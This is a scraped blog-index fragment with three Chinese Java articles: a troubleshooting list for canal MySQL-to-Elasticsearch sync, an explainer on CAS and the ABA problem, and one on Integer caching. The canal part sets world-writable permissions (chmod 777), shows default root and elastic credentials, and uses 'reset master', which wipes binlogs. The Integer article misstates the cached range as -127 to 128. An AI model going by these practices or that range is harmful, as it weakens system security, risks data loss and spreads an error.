123456789java.lang.RuntimeException: java.lang.RuntimeException: java.lang.ClassCastException: com.alibaba.druid.pool.DruidDataSource cannot be cast to com.alibaba.druid.pool.DruidDataSource at com.alibaba.otter.canal.client.adapter.es7x.ES7xAdapter.init(ES7xAdapter.java:54) ~[client-adapter.es7x-1.1.5-jar-with-dependencies.jar:na] at com.alibaba.otter.canal.adapter.launcher.loader.CanalAdapterLoader.loadAdapter(CanalAdapterLoader.java:225) [client-adapter.launcher-1.1.5.jar:na] at com.alibaba.otter.canal.adapter.launcher.loader.CanalAdapterLoader.init(CanalAdapterLoader.java:56) [client-adapter.launcher-1.1.5.jar:na] at com.alibaba.otter.canal.adapter.launcher.loader.CanalAdapterService.init(CanalAdapterService.java:60) [client-adapter.launcher-1.1.5.jar:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_271] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_271] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_271] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_271] 原因： druid 包冲突 解决： 1、修改 client-adapter/escore/pom.xml 123456&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;!--add by whx 20220112--&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; 2、重新打包 3、将 client-adapter/es7x/target/client-adapter.es7x-1.1.5-jar-with-dependencies.jar 上传到服务器，替换 adataper/plugin 下的同名 jar 文件 1scp client-adapter.es7x-1.1.5-jar-with-dependencies.jar root@172.16.188.2:/var/local 4、给该文件赋权 1chmod 777 /var/local/client-adapter.es7x-1.1.5-jar-with-dependencies.jar 5、重启服务 # 10 CanalParseException: java.io.IOException: EOF encountered 将 lib 目录下的 mysql 驱动器替换为 mysql8.0，并附权。参考上述 # 11. CanalClientException: java.io.IOException: Broken pipe Error sync but ACK 服务连接断开了，将 deployer 和 adapter 都关闭，先启动 deployer 再启动 adapter # 12. DocumentMissingException[[_doc][1413298413755211778]: document missing] 1、es 集群出现问题，导致 doc 无法分配。常见的是分片数的问题，可能是副本分片过多，导致集群报黄 解决： 因为我的是 es 单节点，所以将主分片数设置为 1，副本分片设置为 0。不申明的话默认创建副本分片数为 1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455PUT user{ &quot;mappings&quot;: { &quot;properties&quot;: { &quot;code&quot;: { &quot;type&quot;: &quot;keyword&quot; }, &quot;email&quot;: { &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: { &quot;keyword&quot;: { &quot;type&quot;: &quot;keyword&quot; } } }, &quot;realName&quot;: { &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;ik_smart&quot;, &quot;fields&quot;: { &quot;keyword&quot;: { &quot;type&quot;: &quot;keyword&quot; } } }, &quot;roleId&quot;: { &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: { &quot;keyword&quot;: { &quot;type&quot;: &quot;keyword&quot; } } }, &quot;postId&quot;: { &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: { &quot;keyword&quot;: { &quot;type&quot;: &quot;keyword&quot; } } }, &quot;deptId&quot;: { &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: { &quot;keyword&quot;: { &quot;type&quot;: &quot;keyword&quot; } } } } }, &quot;settings&quot;: { &quot;number_of_replicas&quot;: 0, &quot;number_of_shards&quot;: 1 }} 2、修改的 mysql 数据库数据，在 es 中不存在。先进行全量同步，再进行增量同步 在 conf/example/instance.properties 中修改 12345# 全量同步canal.instance.master.journal.name=mysql-bin.000001canal.instance.master.position=0#2019-01-01 00:00:00 上一次更新的时间canal.instance.master.timestamp=1546272000000 # 13. ERROR c.a.otter.canal.server.netty.handler.SessionHandler - something goes wrong with channel:[id: 0x23d9cad9, /127.0.0.1:46472 :&gt; /127.0.0.1:11111], exception=java.nio.channels.ClosedChannelException 这是由于 deployer 中的 conf/example/meta.dat 与 instance.properties 文件中的 journalName,position,timestamp 不一致导致的 1234567# 查询bin log位置show master status;# 如果显示的binlog不为000001可以执行以下语句重置binlog（轻易别操作，最好让专业的运维人员操作）# 该操作会重新生成binlog，之前的binlog就会清空，之前的数据就不会再同步reset master;# 刷新log日志，自此刻开始产生一个新编号的binlog日志文件flush logs; 将 meta.dat 删除或者修改一致即可。删除后将会按照 instance.properties 中设置的起点同步，生产环境考虑好需要后再删除。 如果想要将之前的数据也同步的话，可以将数据库先导出，再重新导入一遍，即可重新生成 binlog，实现数据的全量同步 # 14. Received error packet: errno = 1236, sqlstate = HY000 errmsg = Could not find first log file name in binary log index file mysql bin log 数据不同步，刷新一下即可 1flush logs; # 15. binlog 也设置为 000001 了，timestamp 也设置了，但就是无法实现全量同步 1、删除 conf/example/meta.dat 2、调整 conf/example/instance.properties 1234canal.instance.master.journal.name=mysql-bin.000001canal.instance.master.position=0#2019-01-01 00:00:00 上一次更新的时间canal.instance.master.timestamp=1546272000000 3、重启 deployer 另外需要注意的是如果 bin log 是只会记录增量操作的，也就是说开启 bin log 之前的历史数据是不会记录的，如果需要同步者之前的数据，解决这个问题有三个办法： （1）通过 logstash-input-jdbc 来实现 （2）通过业务代码来实现（后续会详细讲解这两种方式，可以关注我后续的博客） （3）复制原数据库数据到开启了 binlog 的从数据库，然后从从数据库同步 # 16. adapter 启动报错：something goes wrong when starting up the canal client adapters: java.lang.NullPointerException: null 这个报错是空指针报错，很明显是哪里获取为空的，这种错误没有固定的原因，但大概率上可以锁定配置文件的问题 1、adapter 的配置文件中是有包含了 mysql、es、mq、zk 等配置，如果不需要的配置项，就将其注释掉，不要打开 比如我这里的报错原因就是因为打开了 zookeeperHosts，但是没有配置具体值，所以导致了空指针，因为我不需要 zk，将其注释掉即可 12# flatMessage: true# zookeeperHosts: 2、某些必要的配置没有设置，快速排查的方式就是根据官方文档中给出的配置文件对比排错 可以参考如下配置文件 3、配置文件中配置项排版错位 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667server: port: 8081spring: jackson: date-format: yyyy-MM-dd HH:mm:ss time-zone: GMT+8 default-property-inclusion: non_nullcanal.conf: mode: tcp #tcp kafka rocketMQ rabbitMQ flatMessage: true zookeeperHosts: syncBatchSize: 1000 retries: 0 timeout: accessKey: secretKey: consumerProperties: # canal tcp consumer canal.tcp.server.host: 127.0.0.1:11111 canal.tcp.zookeeper.hosts: canal.tcp.batch.size: 500 canal.tcp.username: canal.tcp.password: # kafka consumer kafka.bootstrap.servers: 127.0.0.1:9092 kafka.enable.auto.commit: false kafka.auto.commit.interval.ms: 1000 kafka.auto.offset.reset: latest kafka.request.timeout.ms: 40000 kafka.session.timeout.ms: 30000 kafka.isolation.level: read_committed kafka.max.poll.records: 1000 # rocketMQ consumer rocketmq.namespace: rocketmq.namesrv.addr: 127.0.0.1:9876 rocketmq.batch.size: 1000 rocketmq.enable.message.trace: false rocketmq.customized.trace.topic: rocketmq.access.channel: rocketmq.subscribe.filter: # rabbitMQ consumer rabbitmq.host: rabbitmq.virtual.host: rabbitmq.username: rabbitmq.password: rabbitmq.resource.ownerId: srcDataSources: defaultDS: url: jdbc:mysql://172.16.188.1:3306/bladex?useUnicode=true #driverClassName: com.mysql.cj.jdbc.Driver username: root password: 123456 canalAdapters: - instance: example # canal instance Name or mq topic name groups: - groupId: g1 outerAdapters: - name: logger - key: esKey name: es7 # es6 or es7 hosts: http://172.16.188.7:9200 # 集群地址，逗号隔开. 127.0.0.1:9200 for rest mode or 127.0.0.1:9300 for transport mode properties: mode: rest # rest or transport # security.auth: test:123456 # only used for rest mode cluster.name: cluster1 # 17 Field error in object ‘target’ on field ‘esMapping’: rejected value []; 1234567Field error in object 'target' on field 'esMapping': rejected value []; codes [typeMismatch.target.esMapping,typeMismatch.esMapping,typeMismatch.com.alibaba.otter.canal.client.adapter.es.core.config.ESSyncConfig$ESMapping,typeMismatch]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [target.esMapping,esMapping]; arguments []; default message [esMapping]]; default message [Failed to convert property value of type 'java.lang.String' to required type 'com.alibaba.otter.canal.client.adapter.es.core.config.ESSyncConfig$ESMapping' for property 'esMapping'; nested exception is java.lang.IllegalStateException: Cannot convert value of type 'java.lang.String' to required type 'com.alibaba.otter.canal.client.adapter.es.core.config.ESSyncConfig$ESMapping' for property 'esMapping': no matching editors or conversion strategy found] 这是配置文件问题，检查 es 下的配置 yml 文件，特别是 sql 语句的语法是否有问题 # 18 java.util.NoSuchElementException 没有找到对应字段导致 检查下 canal 配置文件中的字段是否在 es mapping 中有对应的，大小写是否一致，是否有遗漏 因为我的操作是 mysql 同步至 es，所以这里说明几项容易出错的地方： 1、canal 配置文件中的 sql 中是否大小写一致，canal 是区分大小写的 2、sql 中设置的别名是否与 es mappings 中的名称一致，允许 es 中的部分字段为空，但是不允许 sql 中查询出来的字段在 es mappings 中找不到对应的字段 3、canal 配置文件中的 dataSourceKey 是否正确，其对应到 canal application.yml 配置文件中的数据库是否正确 1dataSourceKey: aaa application.yml 1234567891011121314srcDataSources: aaa: # 与之对应 url: jdbc:mysql://192.168.244.1:3306/aaa?useUnicode=true #driverClassName: com.mysql.cj.jdbc.Driver username: root password: 123456 xxx: url: jdbc:mysql://192.168.244.1:3306/xxx?useUnicode=true username: root password: 123456 yyy: url: jdbc:mysql://192.168.244.1:3306/yyy?useUnicode=true username: root password: 123456 4、canal 配置文件中的排版是否正确，特别注意_index,_type 等属性要放在 esMappings 下 1234567891011121314151617181920212223dataSourceKey: aaa # 这里的key与上述application.yml中配置的数据源保持一致outerAdapterKey: esKey # 与上述application.yml中配置的outerAdapters.key一直destination: example # 默认为example,与application.yml中配置的instance保持一致groupId:esMapping: _index: dept _type: _doc _id: _id sql: &quot;select t.id, t.id as _id, t.dept_name as deptName, t.dept_category as deptCategory, t.parent_id as parentId, t.ancestors as ancestors, t.third_party_id as thirdPartyId, t.phone as phone, t.address as address, t.is_deleted as isDeleted from dept t&quot; #etlCondition: &quot;where t.update_time&gt;='{0}'&quot; commitBatch: 3000 5、sql 查询出来的字段类型与 es mappings 中的字段数据类型是否一致 6、多表同步到同一个索引时，如果都有同一个常量列且值不同时会报错。 如下所示的两个配置文件都有 userSource 常量列用于区分不同的数据来源，但是如下的配置会报错。 xxx.yml 1234567891011121314dataSourceKey: aaa # 这里的key与上述application.yml中配置的数据源保持一致outerAdapterKey: esKey # 与上述application.yml中配置的outerAdapters.key一直destination: example # 默认为example,与application.yml中配置的instance保持一致groupId:esMapping: _index: user _type: _doc _id: _id sql: &quot;select t.id, 0 as userSource, from user t&quot; commitBatch: 3000 yyy.yml 1234567891011121314dataSourceKey: aaa # 这里的key与上述application.yml中配置的数据源保持一致outerAdapterKey: esKey # 与上述application.yml中配置的outerAdapters.key一直destination: example # 默认为example,与application.yml中配置的instance保持一致groupId:esMapping: _index: user _type: _doc _id: _id sql: &quot;select t.id, 1 as userSource, from user_wx t&quot; commitBatch: 3000 # 19. adapter 日志中没有报错，但是没有读取 binlog ｜ Could not find first log file name in binary log index file adapter 日志中没有报错信息，于是去查看 deployer 日志，这里的 example 是你配置的实例 1cat logs/example/example.log 会发现报错： 1Could not find first log file name in binary log index file 解决： 1、既然问题是没有找到数据库的 binglog 文件位置，那么就查看一下现在的 binlog 文件位置，登陆 mysql 执行 2.1 如果你是做增量同步，那么查询当前 binlog 位置 1show master status; 修改 conf/example/instance.properties 文件 123456canal.instance.master.address=192.168.244.17:3306# 这里的文件名要与上面的保持一致，我这里就是文件名不一致，写成了mysql-bin.000001canal.instance.master.journal.name=binlog.000003 canal.instance.master.position=5921canal.instance.master.timestamp=canal.instance.master.gtid= 2.2 如果你要做全量同步，查询 binlog 文件 1show binary logs; 1234567canal.instance.master.address=192.168.244.17:3306# 这里的文件名要与上面的保持一致，我这里就是文件名不一致，写成了mysql-bin.000001canal.instance.master.journal.name=binlog.000001# 位置从0开始canal.instance.master.position=0canal.instance.master.timestamp=canal.instance.master.gtid= 3、重启 deployer 和 adapter # 20. ERROR c.a.otter.canal.adapter.launcher.loader.AdapterProcessor - java.lang.NullPointerException 启动 adapter 报错： 1234567891011121314151617181920212022-05-21 06:28:44.444 [pool-2-thread-1] ERROR c.a.otter.canal.adapter.launcher.loader.AdapterProcessor - java.lang.NullPointerExceptionjava.lang.RuntimeException: java.lang.NullPointerException at com.alibaba.otter.canal.client.adapter.es.core.service.ESSyncService.sync(ESSyncService.java:116) ~[na:na] at com.alibaba.otter.canal.client.adapter.es.core.service.ESSyncService.sync(ESSyncService.java:64) ~[na:na] at com.alibaba.otter.canal.client.adapter.es.core.ESAdapter.sync(ESAdapter.java:115) ~[na:na] at com.alibaba.otter.canal.client.adapter.es.core.ESAdapter.sync(ESAdapter.java:94) ~[na:na] at com.alibaba.otter.canal.adapter.launcher.loader.AdapterProcessor.batchSync(AdapterProcessor.java:139) ~[client-adapter.launcher-1.1.5.jar:na] at com.alibaba.otter.canal.adapter.launcher.loader.AdapterProcessor.lambda$null$1(AdapterProcessor.java:97) ~[client-adapter.launcher-1.1.5.jar:na] at java.util.concurrent.CopyOnWriteArrayList.forEach(CopyOnWriteArrayList.java:895) ~[na:1.8.0_312] at com.alibaba.otter.canal.adapter.launcher.loader.AdapterProcessor.lambda$null$2(AdapterProcessor.java:94) ~[client-adapter.launcher-1.1.5.jar:na] at java.util.concurrent.FutureTask.run(FutureTask.java:266) ~[na:1.8.0_312] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) ~[na:1.8.0_312] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) ~[na:1.8.0_312] at java.lang.Thread.run(Thread.java:748) ~[na:1.8.0_312]Caused by: java.lang.NullPointerException: null at com.alibaba.otter.canal.client.adapter.es7x.support.ES7xTemplate.insert(ES7xTemplate.java:79) ~[na:na] at com.alibaba.otter.canal.client.adapter.es.core.service.ESSyncService.singleTableSimpleFiledInsert(ESSyncService.java:448) ~[na:na] at com.alibaba.otter.canal.client.adapter.es.core.service.ESSyncService.insert(ESSyncService.java:139) ~[na:na] at com.alibaba.otter.canal.client.adapter.es.core.service.ESSyncService.sync(ESSyncService.java:99) ~[na:na] ... 11 common frames omitted2022-05-21 06:28:44.449 [Thread-4] ERROR c.a.otter.canal.adapter.launcher.loader.AdapterProcessor - Outer adapter sync failed! Error sync but ACK! 解决： 1、修改 adapter/application.yml，给 outerAdapters 配置一个 key，注意这里如果有多个 adapter 实例，那么就配置不同的 key 123456789101112131415canalAdapters: - instance: test # canal instance Name or mq topic name groups: - groupId: g2 outerAdapters:# - name: logger - key: esKey3 # 配置key name: es7 # es6 or es7 #hosts: http://192.168.101.11:9200 # 集群地址，逗号隔开. 127.0.0.1:9200 for rest mode or 127.0.0.1:9300 for transport mode hosts: http://192.168.244.11:9200 # 集群地址，逗号隔开. 127.0.0.1:9200 for rest mode or 127.0.0.1:9300 for transport mode properties: mode: rest # rest or transport security.auth: elastic:elastic # only used for rest mode cluster.name: blade-cluster # 21. CanalParseException: parse row data failed. | column size is not match for table deployser 日志报错： 123452022-05-21 07:45:15.651 [MultiStageCoprocessor-Parser-fleet-0] ERROR com.alibaba.otter.canal.common.utils.NamedThreadFactory - from MultiStageCoprocessor-Parser-fleet-0com.alibaba.otter.canal.parse.exception.CanalParseException: com.alibaba.otter.canal.parse.exception.CanalParseException: com.alibaba.otter.canal.parse.exception.CanalParseException: parse row data failed.Caused by: com.alibaba.otter.canal.parse.exception.CanalParseException: com.alibaba.otter.canal.parse.exception.CanalParseException: parse row data failed.Caused by: com.alibaba.otter.canal.parse.exception.CanalParseException: parse row data failed.Caused by: com.alibaba.otter.canal.parse.exception.CanalParseException: column size is not match for table:fleet.source_project_cargo,9 vs 8 解决： 1、可以看到报错中已经给出明确提示了 1column size is not match for table:fleet.source_project_cargo,9 vs 8 2、该错误官方中有解释 官方文档 TableMetaTSDB 在 instance.properties 中设置 123456789canal.instance.tsdb.spring.xml=classpath:spring/tsdb/h2-tsdb.xml# table meta tsdb infocanal.instance.tsdb.enable=true# 以下配置不用开启，因为在canal.properties中已经设置过了，只要没有手动关闭过就不用再配置了#canal.instance.tsdb.dir=${canal.file.data.dir:../conf}/${canal.instance.destination:}#canal.instance.tsdb.url=jdbc:h2:${canal.instance.tsdb.dir}/h2;CACHE_SIZE=1000;MODE=MYSQL;#canal.instance.tsdb.url=jdbc:mysql://127.0.0.1:3306/canal_tsdb#canal.instance.tsdb.dbUsername=canal#canal.instance.tsdb.dbPassword=canal 3、一般将这个开启就解决了，但是我这里即时将其开启还是报错，查阅相关资料有说将 canal.instance.tsdb.enable 设置为 false 后重启解决的，但是我这里将其设置为 false 后依旧没有解决 实在没有其他办法了，查阅官方 github，导致这个问题发生的原因是因为表结构发生过变化，但是 binlog 中读取到的与现在的表结构不一致导致。 于是直接跳过该 binlog checkpoint，也就是将 binlog 的读取位置设置为当前的最新 binlog 位置 （1）查阅当前 binlog 最新位置，mysql 中执行 1show master status; （2）将读取位置该为最新，修改 deployer conf/example/instance.properties 123456canal.instance.master.address=162.14.99.4:3306canal.instance.master.journal.name=mysql-bin.000002canal.instance.master.position=226586328# 当前时间的时间戳形式canal.instance.master.timestamp=1653140932canal.instance.master.gtid= （3）重启 deployer , adapter （4）因为读取的是最新的 binlog。为了把当前的数据同步进来，将需要同步的表或库导出，然后再导入一遍。问题解决（注意：这里的解决方案要谨慎，生产环境因为时时刻刻在产生数据，可行性很低，所以看要么设置一个停机维护来进行实操） # 22. use gtid and TableMeta TSDB should be config timestamp &gt; 0 在 instance.properties 中设置时间戳 1canal.instance.master.timestamp=1546272000000 # 23. RuntimeException: com.alibaba.fastjson.JSONException: unclosed string 该错误是因为 sql 中使用了 group_concat 函数，但是该函数默认长度是 1024，超过的会被截取，导致出现了 json 格式的数据格式不正确，没有正确的关闭 json 解决： 1、修改 my.cnf，扩大 group_concat_max_len 1group_concat_max_len = 102400 2、重启 mysql # 24. MySQLSyntaxErrorException: Unknown column ‘_v._id’ in ‘where clause’ sql 中没有 _id 字段导致，使用 as 将 id 命名别名： select id as _id # 25. adapter 中有同步日志打印，但 es 中数据未同步 我这里出现这个问题是在 canal1.1.6 版本中，原因是 es7 文件夹中的 .yml 文件中书写的 sql 里使用了 `` 将表名括起来，导致未识别，如下所示 1select id,name,age from `user` 解决： 将 `` 去掉即可 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2020/12/11/%E3%80%90Java%E3%80%91Elastic%20canal%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%88%B0ES%E9%85%8D%E7%BD%AE%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99/"},{"title":"CAS机制","text":"# CAS 机制 # 我们先看一段代码： 启动两个线程，每个线程中让静态变量 count 循环累加 100 次。 最终输出的 count 结果一定是 200 吗？因为这段代码是非线程安全的，所以最终的自增结果很可能会小于 200。我们再加上 synchronized 同步锁，再来看一下。 加了同步锁之后，count 自增的操作变成了原子性操作，所以最终输出一定是 count=200，代码实现了线程安全。虽然 synchronized 确保了线程安全，但是在某些情况下，这并不是一个最有的选择。 关键在于性能问题。 synchronized 关键字会让没有得到锁资源的线程进入 BLOCKED 状态，而后在争夺到锁资源后恢复为 RUNNABLE 状态，这个过程中涉及到操作系统用户模式和内核模式的转换，代价比较高。 尽管 JAVA 1.6 为 synchronized 做了优化，增加了从偏向锁到轻量级锁再到重量级锁的过过度，但是在最终转变为重量级锁之后，性能仍然比较低。所以面对这种情况，我们就可以使用 java 中的 “原子操作类”。 所谓原子操作类，指的是 java.util.concurrent.atomic 包下，一系列以 Atomic 开头的包装类。如 AtomicBoolean，AtomicUInteger，AtomicLong。它们分别用于 Boolean，Integer，Long 类型的原子性操作。 现在我们尝试使用 AtomicInteger 类： 使用 AtomicInteger 之后，最终的输出结果同样可以保证是 200。并且在某些情况下，代码的性能会比 synchronized 更好。 而 Atomic 操作类的底层正是用到了 “CAS 机制”。 CAS 是英文单词 Compare and Swap 的缩写，翻译过来就是比较并替换。 CAS 机制中使用了 3 个基本操作数：内存地址 V，旧的预期值 A，要修改的新值 B。 更新一个变量的时候，只有当变量的预期值 A 和内存地址 V 当中的实际值相同时，才会将内存地址 V 对应的值修改为 B。 我们看一个例子： \\1. 在内存地址 V 当中，存储着值为 10 的变量。 \\2. 此时线程 1 想把变量的值增加 1. 对线程 1 来说，旧的预期值 A=10，要修改的新值 B=11. \\3. 在线程 1 要提交更新之前，另一个线程 2 抢先一步，把内存地址 V 中的变量值率先更新成了 11。 \\4. 线程 1 开始提交更新，首先进行 A 和地址 V 的实际值比较，发现 A 不等于 V 的实际值，提交失败。 \\5. 线程 1 重新获取内存地址 V 的当前值，并重新计算想要修改的值。此时对线程 1 来说，A=11，B=12。这个重新尝试的过程被称为自旋。 \\6. 这一次比较幸运，没有其他线程改变地址 V 的值。线程 1 进行比较，发现 A 和地址 V 的实际值是相等的。 \\7. 线程 1 进行交换，把地址 V 的值替换为 B，也就是 12. 从思想上来说，synchronized 属于悲观锁，悲观的认为程序中的并发情况严重，所以严防死守，CAS 属于乐观锁，乐观地认为程序中的并发情况不那么严重，所以让线程不断去重试更新。 在 java 中除了上面提到的 Atomic 系列类，以及 Lock 系列类夺得底层实现，甚至在 JAVA1.6 以上版本，synchronized 转变为重量级锁之前，也会采用 CAS 机制。 CAS 的缺点： 1） CPU 开销过大 在并发量比较高的情况下，如果许多线程反复尝试更新某一个变量，却又一直更新不成功，循环往复，会给 CPU 带来很到的压力。 2） 不能保证代码块的原子性 CAS 机制所保证的知识一个变量的原子性操作，而不能保证整个代码块的原子性。比如需要保证 3 个变量共同进行原子性的更新，就不得不使用 synchronized 了。 3） ABA 问题 这是 CAS 机制最大的问题所在。（后面有介绍） 我们下面来介绍一下两个问题： *1. JAVA 中 CAS 的底层实现 * *2. CAS 的 ABA 问题和解决办法。* 我们看一下 AtomicInteger 当中常用的自增方法 incrementAndGet： public final int incrementAndGet() { for (;😉 { ​ int current = get(); ​ int next = current + 1; ​ if (compareAndSet(current, next)) ​ return next; } } private volatile int value; public final int get() { return value; } 这段代码是一个无限循环，也就是 CAS 的自旋，循环体中做了三件事： \\1. 获取当前值 \\2. 当前值 + 1，计算出目标值 \\3. 进行 CAS 操作，如果成功则跳出循环，如果失败则重复上述步骤 这里需要注意的重点是 get 方法，这个方法的作用是获取变量的当前值。 如何保证获取的当前值是内存中的最新值？很简单，用 volatile 关键字来保证（保证线程间的可见性）。我们接下来看一下 compareAndSet 方法的实现： compareAndSet 方法的实现很简单，只有一行代码。这里涉及到两个重要的对象，一个是 unsafe，一个是 valueOffset。 什么是 unsafe 呢？Java 语言不像 C，C++ 那样可以直接访问底层操作系统，但是 JVM 为我们提供了一个后门，这个后门就是 unsafe。unsafe 为我们提供了硬件级别的原子操作。 至于 valueOffset 对象，是通过 unsafe.objectFiledOffset 方法得到，所代表的是 AtomicInteger 对象 value 成员变量在内存中的偏移量。我们可以简单的把 valueOffset 理解为 value 变量的内存地址。 我们上面说过，CAS 机制中使用了 3 个基本操作数：内存地址 V，旧的预期值 A，要修改的新值 B。 而 unsafe 的 compareAndSwapInt 方法的参数包括了这三个基本元素：valueOffset 参数代表了 V，expect 参数代表了 A，update 参数代表了 B。 正是 unsafe 的 compareAndSwapInt 方法保证了 Compare 和 Swap 操作之间的原子性操作。 我们现在来说什么是 ABA 问题。假设内存中有一个值为 A 的变量，存储在地址 V 中。 此时有三个线程想使用 CAS 的方式更新这个变量的值，每个线程的执行时间有略微偏差。线程 1 和线程 2 已经获取当前值，线程 3 还未获取当前值。 接下来，线程 1 先一步执行成功，把当前值成功从 A 更新为 B；同时线程 2 因为某种原因被阻塞住，没有做更新操作；线程 3 在线程 1 更新之后，获取了当前值 B。 在之后，线程 2 仍然处于阻塞状态，线程 3 继续执行，成功把当前值从 B 更新成了 A。 最后，线程 2 终于恢复了运行状态，由于阻塞之前已经获得了 “当前值 A”，并且经过 compare 检测，内存地址 V 中的实际值也是 A，所以成功把变量值 A 更新成了 B。 看起来这个例子没啥问题，但如果结合实际，就可以发现它的问题所在。 我们假设一个提款机的例子。假设有一个遵循 CAS 原理的提款机，小灰有 100 元存款，要用这个提款机来提款 50 元。 由于提款机硬件出了点问题，小灰的提款操作被同时提交了两次，开启了两个线程，两个线程都是获取当前值 100 元，要更新成 50 元。 理想情况下，应该一个线程更新成功，一个线程更新失败，小灰的存款值被扣一次。 线程 1 首先执行成功，把余额从 100 改成 50. 线程 2 因为某种原因阻塞。这时，小灰的妈妈刚好给小灰汇款 50 元。 线程 2 仍然是阻塞状态，线程 3 执行成功，把余额从 50 改成了 100。 线程 2 恢复运行，由于阻塞之前获得了 “当前值” 100，并且经过 compare 检测，此时存款实际值也是 100，所以会成功把变量值 100 更新成 50。 原本线程 2 应当提交失败，小灰的正确余额应该保持 100 元，结果由于 ABA 问题提交成功了。 怎么解决呢？加个版本号就可以了。 真正要做到严谨的 CAS 机制，我们在 compare 阶段不仅要比较期望值 A 和地址 V 中的实际值，还要比较变量的版本号是否一致。 我们仍然以刚才的例子来说明，假设地址 V 中存储着变量值 A，当前版本号是 01。线程 1 获取了当前值 A 和版本号 01，想要更新为 B，但是被阻塞了。 这时候，内存地址 V 中变量发生了多次改变，版本号提升为 03，但是变量值仍然是 A。 随后线程 1 恢复运行，进行 compare 操作。经过比较，线程 1 所获得的值和地址的实际值都是 A，但是版本号不相等，所以这一次更新失败。 在 Java 中，AtomicStampedReference 类就实现了用版本号作比较额 CAS 机制。 *1. java 语言 CAS 底层如何实现？* * 利用 unsafe 提供的原子性操作方法。* *2. 什么事 ABA 问题？怎么解决？* * 当一个值从 A 变成 B，又更新回 A，普通 CAS 机制会误判通过检测。* * 利用版本号比较可以有效解决 ABA 问题。* # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/02/24/%E3%80%90Java%E3%80%91CAS%E6%9C%BA%E5%88%B6/"},{"title":"【Java】Integer的缓存机制","text":"# Integer 的缓存机制 # 文章目录 一 现象 二 Integer 的缓存机制 2.1 自动装箱等效于 valueOf 2.2 valueOf 2.3 IntegerCache 三 为什么要有缓存机制 3.1 原因 3.2 其他包装对象的缓存 # 一 现象 在引入 Integer 的缓存机制前，可以先判断一下以下几种情况 123456789101112 # 一：自动装箱 Integer s1 = 2; Integer s2 = 2; System.out.println(s1 == s2); # 答案为true # 二：Integer s1 = new Integer(2);Integer s2 = new Integer(2);System.out.println(s1 == s2);# 答案为false 情况二很好理解，虽然传值相同，但是 Integer 是包装类，不同对象的引用地址是不一样的，而 “==” 比的是引用地址，那为什么情况一中会得到结果 true 这里就不得不提到 Integer 的缓存机制了 # 二 Integer 的缓存机制 # 2.1 自动装箱等效于 valueOf 1234#以上代码的情况一的自动装箱等效于Integer中的ValueOf()方法，如下： Integer s1 = Integer.valueOf(2); Integer s2 = Integer.valueOf(2); System.out.println(s1 == s2); # 2.2 valueOf 以下是 valueOf () 方法的具体实现 12345public static Integer valueOf(int i) { if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); } 可以看见，其实现方式和 IntegerCache 有关 # 2.3 IntegerCache IntegerCache 是 Interger 的一个静态内部类，实现如下： 123456789101112131415161718192021222324252627282930private static class IntegerCache { static final int low = -128; static final int high; static final Integer cache[]; static { // high value may be configured by property int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty(&quot;java.lang.Integer.IntegerCache.high&quot;); if (integerCacheHighPropValue != null) { try { int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); } catch( NumberFormatException nfe) { // If the property cannot be parsed into an int, ignore it. } } high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k &lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7) assert IntegerCache.high &gt;= 127; } 可以看到，默认情况下，该静态内部类会直接缓存 - 127 到 128 的 Integer 对象，因此，在 valueOf () 方法中，如果值在 - 127-128 之间，都会直接返回缓存中的该对象而不会重新生成对象，引用地址当然相同了。 而且 java5 引入时，该范围还是固定的，而在 java6 之后，Integer 的缓存中还可以通过 Integer.IntegerCache.high 来设置最大值。由于这个缓存机制，程序中第一次使用 Integer 的时候还需要一定的时间家长该缓存类 # 三 为什么要有缓存机制 # 3.1 原因 因为我们常见的基本数据类型中，使用包装类包装数值时会创建大量对象，如果没有缓存的话，会有大量的包装类被创建，占用内存，降低效率。选择最常用的数值范围设置缓存机制，就可以优化这一现象 # 3.2 其他包装对象的缓存 既然缓存机制的原因我们知道了，那除了 Integer 之外，其他包装类有这种缓存机制吗？肯定是有的 ByteCache：缓存 Byte 对象 ShortChche：缓存 Short 对象 LongChche：缓存 Long 对象 CharacterChche：缓存 Character 对象 Byte，Short，Long 的缓存范围都是 - 128-127，Character 的缓存范围是 0-127，除了 Integer，其他的缓存范围都是固定的 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 